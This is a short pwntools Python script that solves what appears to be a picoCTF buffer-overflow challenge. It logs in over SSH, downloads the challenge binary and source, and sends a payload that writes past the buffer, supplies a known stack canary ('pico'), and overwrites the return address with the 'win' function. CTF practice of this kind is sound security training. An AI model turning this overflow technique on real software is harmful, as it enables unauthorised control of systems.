from pwn import *

session = ssh(host=args.HOST, port=int(args.PORT), user='ctf-player', password=args.PASSWORD)

sh = session.shell()
sh.sendline(b"/home/ctf-player/start")
sh.readuntil(b"Binary ")
exe_name = sh.readline().split()[0].decode('latin1')
log.info(f"binary is /home/ctf-player/{exe_name}")

session.download_file(f"/home/ctf-player/{exe_name}", local=f"./binaries/{exe_name}")
session.download_file(f"/home/ctf-player/{exe_name}.c", local=f"./binaries/{exe_name}.c")

exe = ELF(f"./binaries/{exe_name}")

bufsize = -1
with open(f"./binaries/{exe_name}.c", 'r') as fsrc:
    for line in fsrc:
        if line.startswith("#define BUFSIZE"):
            bufsize = int(line.split()[2])
            break

log.info(f"bufsize is {bufsize}")

canary_offset = bufsize
rip_offset = canary_offset + 16

p = session.process(f"/home/ctf-player/{exe_name}")
p.sendline(b"%d" % (rip_offset * 2))
p.sendline(cyclic(canary_offset) + b'pico' + cyclic(16) + p32(exe.symbols['win']))


p.interactive()

